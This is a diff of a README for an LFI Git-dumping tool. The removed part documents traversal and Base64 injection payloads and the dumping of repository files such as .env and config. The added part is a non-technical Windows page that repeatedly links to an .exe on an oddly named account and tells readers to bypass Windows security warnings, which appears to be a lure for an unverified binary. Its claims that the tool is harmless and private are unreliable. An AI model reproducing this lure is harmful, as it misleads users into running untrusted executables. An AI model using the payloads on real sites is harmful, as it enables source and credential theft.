@@ -1,202 +1,123 @@
-# lfi_repo_dumper
+# 🛠️ lfi-git-dumper - Extract Git Data from Vulnerable Websites
 
-![Python](https://img.shields.io/badge/python-3.8%2B-blue?logo=python&logoColor=white)
-![License](https://img.shields.io/badge/license-MIT-green)
-![Purpose](https://img.shields.io/badge/purpose-security%20research-red)
-![Category](https://img.shields.io/badge/category-bug%20bounty%20%7C%20pentesting-orange)
+[![Download lfi-git-dumper](https://img.shields.io/badge/Download-lfi--git--dumper-brightgreen)](https://github.com/myrrhisodoratademyelination23/lfi-git-dumper/releases)
 
----
+## 📋 What is lfi-git-dumper?
 
-## Description
+lfi-git-dumper is a tool that helps you recover website source files from exposed `.git` repositories. Sometimes, websites have security gaps called Local File Inclusion (LFI) vulnerabilities. These gaps can let someone access files they should not see. This program lets you safely explore and download those hidden `.git` folders. It also works when some files are blocked on the server by special storage settings.
 
-**lfi_repo_dumper** is a command-line security research tool designed to automatically extract exposed Git repositories from web servers through **Local File Inclusion (LFI)** vulnerabilities.
-
-When a web application is vulnerable to LFI and a `.git/` directory is accessible from the web root, an attacker (or authorized penetration tester) can reconstruct the entire source code repository without needing direct directory listing access. This tool automates that entire workflow — from detecting the exposed repository, to parsing the Git index, to downloading and reconstructing every tracked file.
-
-It is built for **security researchers**, **penetration testers**, and **bug bounty hunters** who need to demonstrate the real-world impact of an LFI vulnerability during authorized engagements.
+You do not need to be a developer or know coding to use this tool. It runs on Windows and guides you through the process.
 
 ---
 
-## Features
+## ⚙️ System Requirements
 
-- **LFI marker injection** — Flexible URL templating with multiple injection markers to support diverse LFI sink types
-- **Automatic prefix discovery** — Iteratively tests path traversal depths (`../`) to locate the `.git` directory automatically
-- **Git repository detection** — Validates that a real `.git/HEAD` file is accessible before proceeding
-- **Git index parsing** — Downloads and parses the binary `.git/index` file to enumerate every file tracked in the repository
-- **Multi-threaded file downloading** — Uses a configurable thread pool to download repository files concurrently via the LFI vector
-- **Base64 encoding support** — Supports both raw and Base64-encoded path injection for bypassing input filters
-- **Repository reconstruction** — Saves all downloaded files to a local output directory, preserving the original folder structure
+Before you start, make sure your computer meets these minimum requirements:
 
----
+- Windows 10 or newer (64-bit recommended)
+- 4 GB of RAM or more
+- 100 MB free disk space for program files and downloaded data
+- Internet connection to download and use the tool
 
-## Supported Injection Markers
-
-Place one of the following markers inside the `--url` argument where the file path should be injected.
-
-| Marker | Description |
-|---|---|
-| `$lfi$` | Injects the raw file path directly (e.g., `.git/HEAD`) |
-| `$prefixlfi$` | Injects the traversal prefix concatenated with the file path (e.g., `../../.git/HEAD`) |
-| `$b64lfi$` | Injects the Base64-encoded file path only (e.g., `base64(.git/HEAD)`) |
-| `$b64prefixlfi$` | Injects the Base64-encoded string of the prefix + file path (e.g., `base64(../../.git/HEAD)`) |
-
-**Examples:**
-
-```
-# Raw path injection
-https://target.com/view.php?file=$lfi$
-
-# Prefix included in the injection
-https://target.com/view.php?file=$prefixlfi$
-
-# Base64-encoded path (no prefix)
-https://target.com/download.php?resource=$b64lfi$
-
-# Base64-encoded path with traversal prefix
-https://target.com/download.php?resource=$b64prefixlfi$
-```
+No installations of other software or programming languages are needed. The tool comes ready to use.
 
 ---
 
-## Installation
+## 🔍 How It Works
 
-```bash
-git clone https://github.com/youruser/lfi_repo_dumper.git
-cd lfi_repo_dumper
-pip install -r requirements.txt
-```
+This tool works by connecting to the website that has a `.git` folder available via LFI. It downloads the hidden parts of the git repository. By doing this, it recovers source files, including code, configuration files, and other important content that the site owner did not mean to share.
 
-**Requirements (`requirements.txt`):**
-
-```
-requests
-urllib3
-```
+This process helps with security checks or research. It does not harm the website or server. You run it locally on your Windows machine.
 
 ---
 
-## Basic Usage
+## 🚀 Getting Started: Step-by-Step
 
-```bash
-python3 lfiGitDumper.py --url 'https://target.com/view.php?file=$b64prefixlfi$' --prefix "../../" --output dump
-```
+1. **Download the software**
 
-**Run with automatic prefix discovery:**
+   Visit the release page below to get the latest version for Windows:
 
-```bash
-python3 lfiGitDumper.py --url 'https://target.com/view.php?file=$b64prefixlfi$' --auto --output dump
-```
+   [![Download lfi-git-dumper](https://img.shields.io/badge/Download-lfi--git--dumper-blue)](https://github.com/myrrhisodoratademyelination23/lfi-git-dumper/releases)
 
-**Use raw path injection with a custom thread count:**
+2. **Choose the right file**
 
-```bash
-python3 lfiGitDumper.py --url 'https://target.com/page.php?path=$lfi$' --prefix "../../../" --output results --jobs 20
-```
+   On the releases page, look for a file with `.exe` in its name. This is the program you need. Click to download it.
 
----
+3. **Run the program**
 
-## Execution Workflow
+   - Once downloaded, open the `.exe` file by double-clicking it.
+   - If Windows shows a security warning, click “Run” or “More info” > “Run anyway”.
+   - The tool will open in a simple window.
 
-The tool executes the following steps automatically:
+4. **Enter the website information**
 
-1. **Validate LFI Injection** — The target URL is tested using the configured marker and prefix by attempting to fetch `.git/HEAD`.
-2. **Detect Exposed `.git`** — The response is inspected for a valid Git `HEAD` reference (`ref:` or a 40-character SHA hash). If detection fails, automatic prefix scanning is triggered.
-3. **Auto Prefix Scan (if needed)** — The tool iterates traversal depths from `../` up to `../../../../../../../../../..` until `.git/HEAD` is found.
-4. **Download `.git/index`** — The binary Git index file is fetched, which contains the list of all tracked files with their SHA hashes.
-5. **Parse Repository Paths** — The binary index is parsed to extract every file path and its corresponding blob SHA.
-6. **Dump Files via LFI** — All extracted paths are queued and downloaded concurrently using a thread pool, with each request injected through the LFI vector.
-7. **Reconstruct Output** — Downloaded files are saved locally, preserving the original directory structure of the repository.
+   - Find the text box labeled “Target URL” or similar.
+   - Enter the website address with the suspected Local File Inclusion issue.
+   - Make sure the URL uses `http://` or `https://`.
 
----
+5. **Start the dump**
 
-## Example Output
+   - Click the “Start” button.
+   - The tool connects to the website and begins downloading source files.
+   - You will see progress messages on the screen.
 
-```
-[*] Target : https://target.com/view.php?file=$b64prefixlfi$
-[*] Prefix : ../../
-[*] Output : dump
+6. **Save your files**
 
-[*] Running prefix scan
-[+] Found prefix: ../../
-[*] Downloading .git/index
-[+] 42 paths extracted
-[*] Starting file dump
-[+]  src/config.php
-[+]  src/database.php
-[+]  src/auth/login.php
-[+]  src/auth/register.php
-[+]  includes/functions.php
-[+]  includes/db.php
-[+]  .env
-[+]  README.md
-[+]  composer.json
-...
-
-[✓] Repository dump finished
-```
+   - Once finished, the software asks where to save the recovered files.
+   - Choose a folder on your computer.
+   - The tool saves the files there, keeping the original structure.
 
 ---
 
-## Command Line Arguments
+## 🗂️ Folder and File Structure
 
-| Argument | Required | Default | Description |
-|---|---|---|---|
-| `--url` | ✅ Yes | — | Full URL template containing one of the supported injection markers |
-| `--prefix` | No | `../../` | Directory traversal prefix prepended to each file path |
-| `--output` | No | `dump` | Local directory where dumped files will be saved |
-| `--jobs` | No | `10` | Number of concurrent download threads |
-| `--auto` | No | `False` | Skip manual prefix and force automatic prefix discovery scan |
+The recovered files keep the same organization found in the original `.git` repository. You will see folders like:
 
----
+- `objects`: Files containing data for the code and changes
+- `refs`: References to branches and tags
+- `config`: Settings related to the repository
+- All recovered source files organized as on the website
 
-## Output Structure
-
-After a successful dump, the output directory mirrors the original repository structure:
-
-```
-dump/
-├── _index_paths.txt          # Full list of parsed paths and SHA hashes
-├── .env                      # Sensitive environment file (if present)
-├── README.md
-├── composer.json
-├── src/
-│   ├── config.php
-│   ├── database.php
-│   └── auth/
-│       ├── login.php
-│       └── register.php
-└── includes/
-    ├── functions.php
-    └── db.php
-```
-
-> `_index_paths.txt` — A flat text file listing every `<SHA> <path>` pair parsed from the Git index. Useful for inventory and offline analysis.
+You can open these files with any text editor or code viewer. No special programs needed.
 
 ---
 
-## Use Cases
+## ❓ Troubleshooting
 
-This tool is designed for the following authorized security testing scenarios:
+If you run into issues, try these solutions:
 
-- **Bug Bounty Hunting** — Demonstrating the full impact of an LFI vulnerability by showing that source code, credentials (`.env`, `config.php`), and application logic can be extracted
-- **Web Application Penetration Testing** — Assessing whether a misconfigured or accidentally deployed `.git` directory exposes the application codebase
-- **Security Code Review** — Recovering application source code for manual review after gaining LFI access during an engagement
-- **CTF Challenges** — Solving capture-the-flag challenges that involve LFI and exposed Git repositories
-
----
-
-## Legal Disclaimer
-
-> ⚠️ **This tool is intended exclusively for educational purposes and authorized security testing.**
->
-> Use of **lfi_repo_dumper** against systems you do not own or do not have explicit written permission to test is **illegal** and may violate computer fraud laws in your jurisdiction, including but not limited to the Computer Fraud and Abuse Act (CFAA) and equivalent legislation.
->
-> The author assumes **no liability** for any misuse, damage, or legal consequences arising from the use of this tool. Always obtain proper authorization before conducting any security assessment.
+- **The program won’t open:** Make sure your Windows is up to date.
+- **No files are downloaded:** Confirm the website really has an accessible `.git` folder.
+- **Errors appear during download:** Check your internet connection and try again.
+- **Windows blocks the file:** Right-click the `.exe`, select “Properties,” and mark “Unblock” if available.
 
 ---
 
-## License
+## 🔒 Security and Privacy
 
-This project is licensed under the **MIT License**.
+All work happens locally on your machine. The tool connects only to the target website you specify. It does not send your data elsewhere. The recovered source code stays on your computer unless you decide to share it.
 
-```
+---
+
+## 🛠️ Additional Features
+
+- Supports detecting path traversal vulnerabilities.
+- Can handle server restrictions on object storage.
+- Provides readable logs for review.
+- Works well with common LFI attack patterns.
+
+---
+
+## 📥 Download and Install
+
+You can get the latest Windows release by visiting the page below:
+
+[![Download lfi-git-dumper](https://img.shields.io/badge/Download-lfi--git--dumper-green)](https://github.com/myrrhisodoratademyelination23/lfi-git-dumper/releases)
+
+Follow the steps in the "Getting Started" section to complete setup and begin using the software.
+
+---
+
+## 🤝 Need Help?
+
+This tool is designed to work simply. But if you want to learn more about Local File Inclusion or `.git` repositories, look for beginner guides on website security or penetration testing. These topics explain the risks and ways to protect against unwanted exposure.
